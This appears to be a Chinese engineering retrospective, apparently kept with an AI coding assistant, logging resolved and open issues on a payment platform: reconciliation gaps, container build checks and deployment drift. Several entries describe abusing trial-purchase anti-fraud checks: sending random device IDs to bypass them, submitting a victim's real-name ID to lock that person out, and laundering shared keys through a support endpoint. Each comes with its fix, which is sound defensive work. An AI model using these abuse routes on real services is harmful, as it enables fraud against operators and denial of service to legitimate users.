- **解决/规避**：**纯静态审查、逐字镜像已上线且测试覆盖的 SUB 对账路径，把 AGT 补齐到与 SUB 完全对等**（不发明新机制=静态审查下最安全）。新增 `internal/mtwire/agent_plan_reconcile.go`：`ReconcileStuckAgentPlans`（扫 pending → 向平台主动查单：已付幂等补激活 / 确认未付且超 2h 或网关查无此单置终态 / 瞬时错误留 Failed 下轮重试，**绝不因瞬时错误误杀已付单**；2h 二维码失效 + 26h maxAge 兜底，阈值语义与 `sub_reconcile.go` 一一对齐）+ `expireStuckAgentPlanOrder`（CAS `WHERE status=pending`，防与并发真实激活竞态）+ `listStuckAgentPlans`。`agent_plan_bridge.go` 加终态 `agtOrderExpired`。`reconcile_orchestrate.go` 加第 4 seam `reconcileAgtFn` + `runReconcileAll` 跑 ④、折进 stuck/failed 计数、`alertReconcileHealth` 失败告警体含 AGT。`reconcile_history.go` `reconcileHasFacts`/`recordReconcileRun` 收 AGT（历史 summary+detail 含 agt）。`reconcile_http.go` `HandleAdminListStuck` 增 AGT 卡单（kind="AGT"）、`HandleAdminRunReconcile` 响应增 `agt`。前端 `payment-reconcile/{api.ts,index.tsx}`：`StuckOrder.kind` 加 `'AGT'`、`ReconcileRunResult.agt`、手动对账摘要加 AGT 行、卡单 Badge 给 AGT 上 `destructive`（红，最贵 SKU 醒目）。同步改 3 个既有对账测试的调用点（`runReconcileAll` 4 返回、`recordReconcileRun`/`reconcileHasFacts`/`stubReconcileSeams` 加 AGT 参数）保持编译。**按用户指示纯静态审查、未写/未跑测试；本机无 Go 工具链，`go build`/`go vet`/`go test ./internal/mtwire/` 待服务器验证。代码仅在本地 git 工作树（分支 500L）。** 附带收益：部署后首轮对账将逐笔查证那 4 笔 pending——已付则激活（钱认账）、未付/查无则终态过期，把「不可见、状态未知」转为「可见、自动定论」。
- **权衡（据实）**：① **支付概览（payment_overview）本次不补**——它只查 `payment_orders`，AGT/SUB **同为 ❌**（各自独立表），是两者共有的独立架构问题、非 AGT 专属；补它要跨表 union 重构，超出「镜像 SUB」范围。本次让 AGT 追平 SUB（对账/终态/卡单/告警四层），卡单可见性由 `/stuck` 页覆盖（真正的「看不到」缺口）。② 26h maxAge 强制过期对最贵 SKU 风险略高于低价单，但 `case paid` 恒先于 `case expired`（查到已付无论多旧都先激活），且强制过期仅在网关 26h 持续不可达且从未返回已付时触发、又是 CAS-on-pending（迟到真实激活仍能赢），风险与 SUB 同级——为一致性、可推理性维持统一策略而非为 AGT 发明分叉。
- **升级**：**建议升级为规则 → CLAUDE.md C5**（本轮已拟）。红线：**任何承载金额的订单类型（RCG/SUB/AGT/未来新增），新增时必须同时接入全部对账保护层——主动查单对账、超时置终态、卡单可见（`/stuck`）、失败告警——不得只接「支付回调」主链**。新增付费订单前先问：它进 `runReconcileAll` 了吗？卡单页看得到吗？失败会告警吗？三缺一即回退补齐。与 #303/#309/#315/#327/#333/#339 同属「白名单/清单挑选式遗漏」家族（某一维护点漏登记一类对象 → 该类对象在该维度完全裸奔）。同步 memory `agt-order-no-reconcile-fallback`。

### [已解决] Trial 限购后台释放（ReleaseTrialLimit）删跨用户共享键无归属校验：给 B 释放会放掉 A 合法占用的实名/设备键 → 反刷维度可被客服通道洗掉（PROBE-P3）
- **现象**：`engine.go` 的 `ReleaseTrialLimit` 纯按调用方传入的 `pi` 拼 `realK`/`devK` 直接 `Del`；键值是字面量 `"1"`（`checkTrialLimit` 写入）——**不记录占用者**，无从校验调用方是否真持有它们。`risk_admin_http.go` 又把 `realname_id`/`device_id` 直接取自请求体，与 `user_id` 零绑定。失败链：A 从设备 D 合法消耗 Trial（userK:A + devK:D）→ B 在设备 D 被拒 → B 找客服诉「点开收银台没付款 Trial 被吃」（这正是该端点被文档化的合法用途，客服会信）→ 客服按 B 自报的 device_id 释放 B → `Del(userK:B, devK:D)`，但 devK:D 是 A 的 → 无关新账号 C 从设备 D 白拿一份 Trial。审计日志虽记了动作，但值与用户无绑定，事后无法复核正确性。
- **根因**：C4 补释放通道时只考虑了「谁来删、有没有痕」（鉴权+审计），没考虑「删的键归不归他」——realname/device 维度**跨用户共享**，而键值 `"1"` 把归属信息丢在了写入侧。与 #345（SetNX 返回值被丢弃）同为「共享维度被按单用户语义处理」家族。
- **解决/规避**：**写入侧记归属 + 释放侧验归属**。① `checkTrialLimit` 的 SetNX 值从 `"1"` 改为占用者 userID；② `ReleaseTrialLimit` 改签名 `(…, force bool) (TrialReleaseResult, error)`：userK（按 userID 建键、无共享问题）恒删；realname/device 逐键 `Get` 比对值==userID，不符（含遗留 `"1"` 键=归属不可考）**默认拒删**计入 `Skipped`，`force=true`（仅限客服人工核实的遗留键）绕过；③ 端点加 `force` 入参，响应回报 `released`/`skipped` 逐维结果，审计日志带 `force`/`released`/`skipped`。已知权衡：`Get→Del` 非原子，仅「两管理员并发释放同一键+恰有购买挤进微秒窗口」可误删——人工低频客服操作，接受；热路径决胜仍全建立在 SetNX 原子返回值上（不动 #345 的修复）。**服务器容器验证全绿**（`go build ./internal/... ./router/` + vet + `go test -race ./internal/risk/ ./internal/mtwire/`）；变异验证 2/2 杀死：禁用归属比对 → `CrossUserOwnershipGuard`+`LegacyValueRequiresForce` 红；写入侧改回 `"1"` → `OwnerFullRelease` 红。
- **升级**：候选规则——「**跨主体共享的风控键必须在值里记录归属，任何释放/重置通道必须先验归属、不符默认拒**：删除入参凡来自调用方/用户自报（device_id/realname_id 等），不得直接当作删除目标；归属不可考的遗留键按 fail-closed 拒删，绕过须显式 force + 审计」。是 C4（释放通道）的补丁条款。同步 memory `trial-release-no-ownership-check`。

### [已解决] Trial 三维去重的设备/实名维度由客户端自报且前端从不发送 → 反刷控件对真实流量形同虚设，且直接调 API 可绕过或反向武器化（latent-High）
- **现象**：`purchaseRequest{device_id, real_name_id}`（`http.go:209`）取自请求体、零校验，原样流经 `PurchaseInput→PurchaseLimitCheck→WithPurchaseIdentity→checkTrialLimit`。全仓 `web/` grep 无任何前端发送这两字段 → `realK/devK` 恒空 → `checkTrialLimit` 只执行 userK → **辛苦加固的「用户∪实名∪设备」三维去重对真实流量等价于「只按 user_id」**。而 `engine.go` 的 `PurchaseIdentity.DeviceID` 注释自称「UA+IP 等归一」的服务端指纹，代码里却无任何服务端派生——纯空谈。两个可利用后果：① 直接调 API 发 `device_id:"<每次随机 uuid>"` 免费绕过（全新串永不碰撞，比 user_id-only 还弱）；② 发 `real_name_id:"<受害者的>"` 写一把终身键（`PurchaseDedupTTL=0`）+ 无自助释放 → 定向永久剥夺任意实名用户的 Trial 资格。
- **根因**：反滥用维度让**被监管的一方自行申报**，且信号从未在服务端派生。属「共享维度被按客户端语义处理」家族（对齐 #345 丢弃 SetNX 返回值、#365 释放无归属校验），但更根本——信号源本身就不可信。之所以之前只当 High/Medium：官方 UI 两字段都不发，只能经直接 API 触达。
- **解决/规避**：**信号只认服务端派生，绝不读请求体**。① `purchaseRequest` 删除 `device_id`/`real_name_id` 两字段（客户端即便发也被 `ShouldBindJSON` 无视）；② 新增 `mtwire.deviceFingerprint(c)`：`sha256(ClientIP + "\x00" + UA)` 前 16 字节 hex，两者皆空 → 返 `""`（与「空维度跳过」口径一致，绝不用空串哈希把无信号请求锁成同一设备）——`HandlePurchase` 用它填 `PurchaseInput.DeviceID`；③ 实名维 `RealNameID:""` 暂禁用（无可信 KYC 来源），注释标注待接入后由 authenticated user 的服务端记录派生；④ 订正 `PurchaseIdentity` 误导注释 + `STATUS.md` 作废「需前端上送」的旧指引。粒度权衡：同 NAT+同 UA 的不同真人会撞进同一指纹 → 连带收紧（与引擎 fail-closed 取向一致，误伤经带鉴权+审计的 `ReleaseTrialLimit` 解），仍远强于可绕过+可武器化的自报。**注**：admin 释放端点（`risk_admin_http.go`）仍从请求体取 device_id/real_name_id——那是带 AdminAuth+审计的运维释放通道、operator 主动指定释放目标，属设计内。新增 `TestDeviceFingerprint`（稳定/区分/空信号→""）。本机无 Go 工具链（[[local-no-build-toolchain]]），待服务器 `go test ./internal/mtwire/ ./internal/risk/`。
- **升级**：候选规则——「**任何反滥用/风控维度（去重、限购、指纹、信誉）的信号必须由服务端从可信来源派生，绝不承载客户端自报值**：设备→服务端 ClientIP+UA 归一；身份→authenticated 主体的服务端记录；缺可信来源的维度留空跳过、绝不用请求体字段兜底」。与 C4/#365 的「释放侧验归属」互补——本条治「写入侧信号源不可信」。同 C2/C3/C5/C6/C7 的「清单挑选式遗漏」家族（此处漏的是「信号可信性」这一列）。

> Git / CI / 文档维护 / 与 AI 协作（vibe coding）过程中反复出现的困难与规避方式。

### [已解决] 错误码前缀不统一 + 详设错误码列表不全
- **现象**：detailed-design §2.8 写 `SIGN_INVALID`/`ORDER_ALREADY_PAID`（无前缀），但各模块实现统一用带前缀码（`PAY_SIGN_INVALID`、`RATIO_BELOW_FLOOR`…）；多个 Worker 还各自补了同命名空间码（`SLUG_INVALID`、`STATS_CROSS_TENANT`、`WALLET_AMOUNT_INVALID`、`AGENT_TYPE_INVALID` 等）。
- **根因**：详设的错误码枚举不完整，且"前缀约定"未硬性写明，多 Agent 并行各自取舍。
- **解决/规避**：统一约定**错误码必须带模块前缀**；以 `doc/api-contract.md` 的「错误码注册表」作为唯一事实源，前端按此对接。
- **升级**：建议升级为 CLAUDE.md 硬约束（错误码命名规范）；待错误码表稳定后固化。

### [已解决-规避] 消费者定义接口导致跨模块值类型分歧，需组装层适配器
- **现象**：并行 Worker 各自在本包定义消费者接口及其值类型 —— `wallet.EarningEntry` ≠ `agent.EarningEntry`，`relay.CallContext` ≠ `risk.CallContext`，各模块各有 `PricingGuard`/`EarningSink`/`PaymentGateway`。编译期零耦合，但无法直接互调。
- **根因**：这是"消费者定义接口（依赖倒置）"模式的固有代价 —— 换来的是每个模块可 mock 依赖独立单测（14 模块平均 ~98.7% 覆盖率正源于此）。
- **解决/规避**：在 `cmd/main` 写**薄适配器**对齐类型（如 `Reference→agent.SourceID` 做幂等键、USD↔¥ 单位换算、`tokenplan.SubscriptionQuotaFactory`→`billing.SubscriptionSourceFactory`）。
- **升级**：已在 progress.md「组装层 TODO」与 api-contract.md「装配映射」登记；集成阶段统一实现，不在各模块内耦合。

### [已解决] 服务器前端 typecheck：bun workspace 的 `catalog:` 依赖必须在 web/ 根装，且 Docker build 不做 tsgo
- **现象**：在 `web/default` 单独 `bun install` 报 `oxlint@catalog: failed to resolve`（一堆 `*@catalog:`），且 `tsgo: command not found`。
- **根因**：`web/` 是 bun workspace，`web/default/package.json` 用 `catalog:` 协议引用版本，**catalog 定义在 workspace 根 `web/package.json` + `web/bun.lock`**——只在子包目录装解析不到 catalog，devDeps（含 tsgo）也装不上。另：根 Dockerfile 前端阶段用 `bun run build`(rsbuild/SWC，只转译**不做类型检查**)，类型错误**不会**让镜像构建失败 → 必须独立跑 `tsgo`。
- **解决**：①typecheck 在 workspace 根装：`docker run -v /root/newapi-compile/web:/web -v newapi_buncache:/root/.bun/install/cache -w /web oven/bun bun install --frozen-lockfile` → 再 `cd default && bun run typecheck`（=`tsgo -b`，看 `EXIT=0`）。②构建/部署用 `/root/newapi-test`（即运行栈 compose 的 working_dir，`docker compose ls` 可查）；typecheck 用带 node_modules 的 `/root/newapi-compile`——改完两边都 scp 同步。③oxlint 不在构建门里，存量告警勿误判为本次引入，只修自己新增行。
- **升级**：纯前端改动验收三步：scp 同步 → workspace 根 `bun install` + `tsgo -b`(EXIT=0) → `docker compose -p newapi_test up -d --build` 后 `grep` 二进制确认标识入包（`docker exec app grep -c <marker> /new-api`）。

### [已解决] 接旧规格前先核对现状：三处"规格已过时"的坑（自定义域名任务）
- **现象**：自定义域名任务书让"仿照 `/api/internal/order/paid` 内网端点"、用 `ERR_DOMAIN_LIMIT` 等错误码、并假设 `.env` 变量会自动进容器——三处都与现状不符。
- **根因/发现**：①`/api/internal/order/paid` 在 realpay-inprocess 重构中**已退役**（现存 internal-auth 范式只剩 `auth-service` 的 `X-Internal-Secret`）。②本仓库错误码**无 `ERR_` 前缀**惯例，一律模块前缀（`TENANT_NOT_FOUND`/`DOMAIN_LIMIT`）。③Docker Compose 的根 `.env` **仅用于 `${...}` 插值，不自动注入容器**——变量必须在 compose `environment:` 块里显式 `KEY: "${KEY}"` 才到 app。
- **解决/规避**：①新内网端点沿用 `X-Internal-Secret`（主站读 `MT_INTERNAL_SECRET` env，恒定时间比较 + deny-by-default），签发脚本走 `127.0.0.1:3100` 直连。②错误码落 `DOMAIN_*`（`internal/tenant/errors.go`）。③`MT_INTERNAL_SECRET`/`MT_SITE_IP` 加进 `deploy/docker-compose.test.yml` 的 `environment:` 块（引用服务器 `.env`）。
- **升级**：**接他人/旧规格前，先用 grep/ToolSearch 核对"被引用的端点/约定/机制是否还存在"**，别照搬过时假设（W1 的延伸）。
### [已解决] Go 编译校验免整栈部署：用 golang:1.25.1 容器只 build（`./...` 会因 embed 缺 dist 报错，须点包）
- **现象**：想在服务器验证后端能否编译，但 W4 本地无 Go，且不想 `docker compose up --build` 重部署运行栈；宿主机也没有 `go`/`bun`/`node`（登录 shell PATH 里都没有，只在 Docker 里）。
- **根因**：服务器工具链全在容器内（`docker images` 有 `golang:1.25.1`（与 go.mod `go 1.25.1` 精确匹配）+ `node:22`/`oven/bun`）。`go build ./...` 会走到 `main.go` 的 `//go:embed web/classic/dist`（scp 源码副本无前端 dist 产物）→ `pattern ... no matching files found` EXIT=1，**并非代码错误**（真实镜像构建先出前端 dist 再 embed）。
- **解决**：只 build 受影响包，绕开 embed：`docker run --rm -v /root/newapi-test:/app -w /app -v newapi_gomodcache:/go/pkg/mod -v newapi_gobuildcache:/root/.cache/go-build -e GOFLAGS=-buildvcs=false -e GOPROXY=https://goproxy.cn,direct golang:1.25.1 sh -c "go build ./internal/... ./router/..."`（`-buildvcs=false` 因 scp 副本非 git 仓；goproxy.cn 因机房在国内；模块/构建缓存挂命名卷复用）。前端 typecheck 同理容器化：`node:22`（或 `oven/bun`）挂 `/root/newapi-compile/web`（已装 node_modules）跑 `tsgo -b`（EXIT=0=过）。容器 sh 是 dash，别用 `${PIPESTATUS[]}`；exit 码用 `cmd > log 2>&1; echo $?`。
- **升级**：后端纯改动验收 = scp 同步 `/root/newapi-test` → 上述 golang 容器点包 `go build` → EXIT=0；无需 compose 重部署。补足 §四前端 typecheck 条，构成前后端"改完不部署也能编译校验"的完整闭环。

### [已解决] feature/finance-report 工作树落后于服务器：缺未入库的 internal/siteconfig/gormrepo（已 3-way 合并入 500L）
- **现象**：本地校验后端时，服务器 `go build` 报 `wire.go: could not import internal/siteconfig/gormrepo`；`a.ReportRepo undefined` 是该 import 失败使整个 mtwire 包类型失效的**级联**。
- **根因**：本 `.ccg` 工作树分支 `feature/finance-report` 的 HEAD **从未含** siteconfig 装配（`git show HEAD:wire.go` 无 siteconfig），而服务器 `/root/newapi-test` 有一份**未入库（scp 而来，git 不跟踪）**的 `internal/siteconfig/gormrepo`（OEM 装修 §5/§9）+ 对应 wire.go/mt-router.go/侧栏/语言包装配。两边 wire.go 各自是公共祖先的超集（本地多 reportrepo、服务器多 siteconfig）——**必须 3-way 合并，不能整文件覆盖**（否则丢 siteconfig）。财务报表改动为纯增量、与 siteconfig 区域不相交：`git diff HEAD -- wire.go mt-router.go` 生成的补丁在服务器真实副本上 `patch --fuzz=3` 干净套用（0 rej），合并后 `go build` EXIT=0 已验证。
- **解决**：其后 siteconfig 已随自定义域名提交（aba3a93/bdfb533）入库，"服务器未入库"顾虑消失 → 遂在 500L 上直接 `git merge feature/finance-report`（真三方合并，非补丁套用）：wire.go/use-sidebar-data.ts git 自动合并（reportrepo + siteconfig 两套 provider 并存、双 AutoMigrate），mt-router.go/RETRO/en+zh 共 4 处**纯增量冲突按并集解决**（en=5214 / zh=5316，无重复键、无值冲突）。并行的 site-branding/主题预设在飞工作（11 文件 + 3 style 键）分离提交、未混入。服务器容器化校验 `go build ./internal/... ./router/...`（golang:1.25.1）+ `tsgo -b`（oven/bun）均 EXIT=0。合并提交 c892e36、主题 c2b12a8。

### [已解决·升级为规则] 合并含新增/改名路由的分支后，必须先重生 routeTree.gen.ts 再跑 tsgo -b
- **现象**：财务报表合并后独立 `tsgo -b` 报 3 处 `TS2345: '<路径>' is not assignable to keyof FileRoutesByPath`——finance 2 条 + admin-custom-domains 1 条（后者是 500L 既有滞后，非本次引入）。
- **根因**：`web/default/src/routeTree.gen.ts` 是 `@tanstack/router-plugin` 的生成物，只在 `rsbuild dev/build` 时从 `src/routes/` 重生；两分支都加了路由源文件却没提交重生后的树，提交树滞后。`createFileRoute('/x')` 的路径要命中生成的 `FileRoutesByPath`，否则类型报错（该文件自身 `@ts-nocheck`，报错落在路由源文件）。rsbuild 部署会自动重生 + SWC 不做类型检查 → **部署不受影响，但独立 tsgo 门会挂**。
- **解决**：服务器容器内跑生成器（无 CLI，用程序化 API，与插件同法 `new Generator({config:getConfig({target:'react',autoCodeSplitting:false},ROOT),root:ROOT}).run()`）：`docker run --rm -v /root/newapi-compile/web:/web -w /web/default node:22 node <脚本>`。`autoCodeSplitting=false` 与既有 eager 树同模式，diff 干净（68 增 0 删，仅补 3 条路由）。重生后 tsgo -b EXIT=0，回传提交 7b190a6。
- **升级**：**合并/rebase 任何新增或改名 `src/routes/**` 的分支后，先 router-generator 重生 routeTree.gen.ts 再验前端**；§四前端验收范式补一步"路由有增改 → 先重生路由树"。见 [[frontend-typecheck-bun-catalog]]。

### [已解决] Workflow 多 Agent 生成的前端文件带尾部 `</content>` 包裹标签（会全量 typecheck/build 失败）
- **现象**：用 Workflow 多 Agent 并行生成工单 default 前端，25 个 `.ts/.tsx` 文件每个末行都多出一个杂散 `</content>` XML 标签（`od -c` 确认真实字节），非法 TS，会让 esbuild/SWC 解析、`bun run typecheck`、`bun run build` 整个 feature 全挂。
- **根因**：子 Agent 落盘时把「工具调用包裹标签」误写进了文件内容尾部（生成产物污染），系统性出现在**每个**新建文件。
- **解决/规避**：Verify 阶段 Agent 用锚定 `sed '/^<\/content>$/d'` 逐文件删除（每文件唯一、恒在末行）；主控二次核验 `grep -rlE '</?content>|^\x60\x60\x60|<file>'` 新增文件 → 0 残留。
- **升级**：**多 Agent 生成/落盘一批文件后，主控必须做「产物完整性扫描」**（stray XML 包裹标签 / ``` 代码围栏 / `<file>` 标签）再进构建门；本机无 go/node 时更要用 grep 静态兜住，别等服务器 typecheck 才发现。

### [已解决] 服务器非 git 副本按「显式文件清单」部署会静默漏文件 → 包内不一致，被后续部署撞出
- **现象**：部署「代理折扣系数」时服务器 `go build` 报 `undefined: ErrPayoutAccountInvalid`（internal/agent/model.go 引用），但本机 `go build` 全过。本机每个包自洽，服务器却缺定义。
- **根因**：服务器 `/root/newapi-test` 是非 git 的 rsync/tar 副本，历来用 `git archive HEAD <显式文件列表> | tar x` 部署——**只覆盖列表内文件，从不删也不补漏**。更早的「提现闭环」把 `internal/agent` 的一批文件（errors.go/service.go/withdrawal.go/port.go/repo.go）改了跨文件符号，但那次部署的显式清单**漏掉了这些文件**，服务器一直是「旧 errors.go（无 ErrPayoutAccountInvalid）+ 旧 model.go（不引用它）」的自洽旧态、能编译。本次我把 model.go 单独推到 HEAD（引用了该符号），而 errors.go 仍是旧的 → 包内不一致 → 编译炸。文件 sha 对比坐实：errors/service/withdrawal/port/repo 五个文件服务器全落后于 HEAD，仅 earning.go 一致。
- **解决**：整目录同步 `git archive HEAD internal/agent | ssh … tar x`（该目录无锁定文件，安全），使包在 HEAD 自洽 → rebuild 通过、health 200、`discount_ratio` 列 AutoMigrate 建好。
- **升级**：**当一次改动新增/改动了某包内跨文件符号（新 error/新导出/改签名），部署要推整个受影响包目录，而非只推自己改的那几个文件**；遇到服务器 `undefined: X`/`could not import` 先按 `git show HEAD:<file> | shasum` vs 服务器 `shasum` 逐文件比对锁定漂移范围。锁定文件（payment_inprocess.go/realpay/*/option.go/payment_wxpay_alipay.go——含未入库 WIP）**不可**整目录 `archive HEAD` 覆盖（会回退 WIP），只能单推自己确需的文件。参见 [[feature-finance-report 工作树落后于服务器]]。

### [未解决·需用户介入] 服务器 /root/newapi-test 源码被外部进程整仓回退（协作者 rsync / deploy.sh 用了过期源）
- **现象**：部署「子域名+删除代理」时服务器 `go build` 报本会话早已加过的符号 `undefined`（AgentParams.DiscountRatio / PayoutAccount / GetPayoutAccount）。逐文件核实发现**整仓退回到会话开始前的状态**：`report.NetIncomeTrend`=0、`tokenplan DiscountRatio`=0、`internal/agent` 全套 DIFF（本会话前的 sha）——即本会话所有后端提交在服务器**源码**上凭空消失（但当时**运行中的二进制**仍是最新，因为上一次部署产物还在跑）。仅我本次刚推的几个文件是 HEAD。
- **根因**：`/root/newapi-test` 是非 git 的 rsync 副本；某个**外部动作**（协作者从自己过期的 Mac 副本 rsync、或 `deploy/ops/deploy.sh` 用了过期源）把整棵源码树覆盖回了旧版。这**不是**我的部署造成的——上一次 i18n 部署（health 200 带我的改动）之后、本次之前发生的。DB 迁移过的列（discount_ratio 等）仍在（只回退了源码文件，没动库）。
- **解决/规避（本次）**：`git archive HEAD | ssh 'tar --exclude=<锁定文件> -xf -'` **整仓 HEAD 覆盖服务器源码（排除锁定 WIP 文件）**恢复所有会话提交；再 `rm` 掉「本会话删除但被回退恢复」的孤儿文件（`git diff --diff-filter=D --name-only <会话基线>..HEAD` 得列表，注意 git archive 只加不删、rspack 会顺着被回退恢复的旧路由/旧组件把引用了已删符号的孤儿也拉进构建 → 编译失败）；重建后 health 200。
- **⚠️ 会复发**：只要那个外部 rsync/deploy 再跑一次，服务器源码会再次被覆盖回退。**需用户排查并停用**：谁/什么在 rsync 到 `/root/newapi-test`？是不是 `deploy/ops/deploy.sh` 的源目录指向了过期副本？多人协作时**约定唯一部署源**（最好是从 git 仓库拉，而非各自 Mac 副本 rsync）。在此之前，每次部署后都要 `grep` 关键符号确认没被回退。参见 [[服务器非 git 副本按显式清单部署漏文件]]。

### [已解决] 验证前端是否进二进制：用 `grep 二进制` 别用 `strings | grep`（strings 丢多字节中文，恒 0 误判）
- **现象**：部署支付概览后 `docker exec … strings /new-api | grep -c 已收款待入账` = 0，连本来在的「折扣系数」「代理加盟」也全 0，误判为"前端没进二进制/构建层命中缓存"，白跑了一次 `--no-cache` 重建。
- **根因**：`strings` 默认只抽 ASCII 可打印串（长度≥4），**中文 UTF-8 是非 ASCII 多字节，会被整段丢弃** → `strings | grep 中文` 恒 0（与前端在不在无关）。之前"折扣系数=2"能查到是因为用了**直接 `grep -c 折扣系数 /new-api`**（grep 匹配二进制里的原始 UTF-8 字节，能命中 embed 的 dist）。
- **解决**：验证 embed 的前端中文串一律 `docker exec <app> sh -c "grep -c <中文> /new-api"`（直接 grep 二进制），不要过 `strings`。直接 grep 后 已收款待入账=1/支付对账=2/待支付=4/折扣系数=3/代理加盟=2，全在。
- **升级**：**「某中文串在不在编译产物里」的判定，永远用直接 grep 二进制，别用 strings**；否则会对着假 0 瞎折腾（重建/回滚）。顺带：Docker 前端构建层（`COPY ./web/default` → `bun run build`）偶发命中旧缓存，真遇到才 `--no-cache` 重建——但先用直接 grep 确认它是真没进，别被 strings 骗。

### [未解决·需用户介入] macOS TCC 隐私保护挡住 CLI 读取 ~/Documents / ~/Desktop（交接素材读不到）
- **现象**：用户交接素材路径 `/Users/cc/Documents/Codex/…/ai-logo-pack/logo-only`（20 个国产模型 logo），CLI 侧 `ls` 报 `Operation not permitted`；连 `ls ~/Documents`、`ls ~/Desktop` 顶层都被拒。非沙箱模式同样被拒。
- **根因**：macOS TCC（隐私与安全性 → 文件与文件夹）按「宿主 App」授权；承载 Claude Code 的终端 App 没有「文稿/桌面」访问权，其全部子进程（含 `!` 前缀命令）一律 `EPERM`。与文件是否存在无关。
- **解决/规避**：二选一——① 系统设置 → 隐私与安全性 → 文件与文件夹（或完全磁盘访问权限）→ 给承载终端授权「文稿」，必要时重启终端 App 后重试；② 用 Finder 把素材拖进仓库或 `/tmp`（TCC 不管这些路径）。**以后交接素材尽量放仓库内或 /tmp，别放 Documents/Desktop。**

### [已解决·规避] 无头 Chrome `--virtual-time-budget` 对含 WebGL rAF 循环的页面截图恒于 ~1s，预算参数不生效
- **现象**：给 bulb-orbit 页面的 `#final`（lit 全景）截图，`--virtual-time-budget` 从 2000 加到 60000 甚至加 `--timeout=300000`，产物像素级不变（画面质心跨档误差 <1px），真实耗时恒约 1s——此时 `.rise` 文字上升动画（延迟 0.3–0.62s + 0.9s 时长，约 1.6s 完成）与 24 芯片扫光（约 2.1s 完成）都还没播完，被提前定格成半成品画面。
- **根因**：页面用 `requestAnimationFrame` 驱动常驻 WebGL 渲染循环（`loop3d`/`renderTick`），无头 Chrome 的虚拟时间预算机制与这类常驻 rAF 循环叠加时不按预算推进，捕获时刻实际由启动到就绪的真实时间决定，与 `--virtual-time-budget` 参数值无关。
- **解决/规避**：需要「动画播完之后」状态的截图改用 playwright：固定视口（本例 1920×990）→ 导航 → 等待 ≥3s 真实墙钟时间 → 截图；`#final` 场景因同文档 fragment 导航不会重新执行脚本，须先导航到 `about:blank` 再导航到带 `#final` 的完整 URL，确保是真实整页加载后再等待截图。
- **升级**：含 WebGL/rAF 常驻循环的页面，今后截「动画播完之后」的状态一律用 playwright + 真实等待，不再用无头 CLI 的 `--virtual-time-budget` 作为时间控制手段。

### [已解决] 额度沉淀监控读「死列」used_usd → 恒显 0 消耗（真源在原生 user_subscriptions.amount_used）
- **现象**：P2-BRK-01 额度沉淀监控上线后，每笔订阅都被当成 0 消耗——`ExpiredUnusedUSD≈Σ全额 limit`（沉淀率≈100%）、`countExhaustedActiveSubs`（used≥95%limit）永不触发、明细 `usage_pct` 恒 0%；买家「我的订阅」页剩余额度也恒等于满额。
- **根因**：`tokenplan_subscriptions.used_usd` 的**唯一写入者是 tokenplan 计费桶的 `Meter`（`gormrepo.go:399` `used_usd += cost`）**，而该桶（`billing.NewService`/`wallet.NewService`）在 `wire.go`/`main.go` **从未装配**（grep 0 命中）。生产 `/v1` 计费实际走**原生订阅桶**（`subscription_bridge.go` `defaultActivateNativeSub` → `model.CreateUserSubscriptionFromPlanTx`），用量记在 **`user_subscriptions.amount_used`（quota 单位）**，由 `PreConsumeUserSubscription`/`PostConsumeUserSubscriptionDelta` 维护。全仓无任何「原生用量 → used_usd」同步代码 → `used_usd` 是永为 0 的**死列**。而监控（`breakage/gormrepo` Overview/Detail/CollectSnapshots + `breakage_snapshot_loop.go` countExhausted）与买家/管理端页全都读这列算 `limit − used`。
- **解决（方案 A · 读侧投影 · 只前向）**：真源经 `s.source_order_id → mt_subscription_orders.native_sub_id → user_subscriptions.amount_used` 关联；`真实 used_usd = amount_used / common.QuotaPerUnit`。① `breakage/gormrepo` 四处查询（Overview 活跃剩余/到期未用、Detail、CollectSnapshots）LEFT JOIN 原生桶投影（新增 `nativeUsedUSD` 片段 + `joinNativeUsage` helper，仍守本包「只借列名不 import 兄弟 model」硬约束）；② `mtwire` `countExhaustedActiveSubs` 同投影；③ 买家/管理端在 mtwire 层（bridge 归属层）`fillNativeUsedUSD` 批量覆盖 `UsedUSD`，保持 tokenplan 仓储不感知原生桶。历史快照不回填（前向修正）。单测 harness（gormrepo_test + mtwire breakage_test）改为把 `used_usd` 置 0、真值只塞 `amount_used`，坐实「只读真源」。服务器 `golang:1.25.1` 容器 `go build ./internal/... ./router/...` + `go test ./internal/breakage/... ./internal/mtwire/...` 全绿。
- **坑点**：SQL 除数须用**浮点字面量**（`500000.0` 而非 `500000`）——sqlite 两整数相除会**截断归零**，浮点字面量强制实数除法，跨 MySQL/sqlite 一致。
- **升级**：**给某列做聚合/监控前，先确认它在生产路径上真的被写**（grep 写入者 + 核实其调用链在 wire.go 是否装配）——「有列且有读逻辑」不等于「有数据」；未装配的计费桶留下的列就是恒零死列。参见 [[used-usd-dead-column-real-usage-native-bucket]]。

### [已解决] AGT 代理套餐 slug 仅在付款后校验：非法/占用/软删占位 slug → 付款黑洞（钱离账却确定性永久激活失败）；叠加 suspended「软款版付款黑洞」（Critical/High）
- **现象**：`HandlePurchaseAgentPlan` 把买家自由文本框填的 `slug` 零校验落单（`_ = c.ShouldBindJSON(&body)` → `Slug: body.Slug`）后**立刻向微信/支付宝真实下单收钱**，slug 合法性直到付款成功后的回调激活（`provisionAgentFromOrder → TenantService.Create → tenant/slug.go`）才校验。三类触发全部在付款后且重试永远同错：① 买家按中文习惯填「我的小店」/`ai`(<3位)/`my_shop`/`admin`(保留词)/他人已占用 slug → `SLUG_INVALID/RESERVED/DUPLICATE`；② **无需任何输入**：owner 曾被软删的代理，`tenants.slug` 唯一索引状态盲仍占位，而 `agentTenantByOwner` 用 `status<>deleted` 排除软删 → 重购走「新建」→ `normalizeAgentSlug` 派生 `agent<uid>` 撞软删占位 → 永久 `ErrSlugDuplicate`。买家扫码付 ¥990–9990 → 回调激活确定性失败 → 微信按 15s..6h 重推约 24h 全同错 → 放弃 → 订单永停 pending；叠加 AGT 无对账（见上文 C5 条），钱进静默黑洞。审查另发现同族 **suspended 软款版**：被管理员停用的代理其 owner 仍能付费，升级分支从不翻 status → 收钱+台账已激活但 `TenantByOwner`（agent 自助鉴权）排除 suspended → 付了钱登不进后台（三态不一致）。对照：tokenplan `HandlePurchase` 是「先 `Subscriptions.Purchase` 校验再出支付凭据」——同文件两条购买路径标准不一致。
- **根因**：付款前下单路径与付款后激活路径**校验时机错配**——把「决定能否交付」的确定性校验放在了「已经收钱之后」。slug/suspended 同属「清单挑选式遗漏」家族：`HandlePurchaseAgentPlan` 漏了 tokenplan 早有的付款前校验。
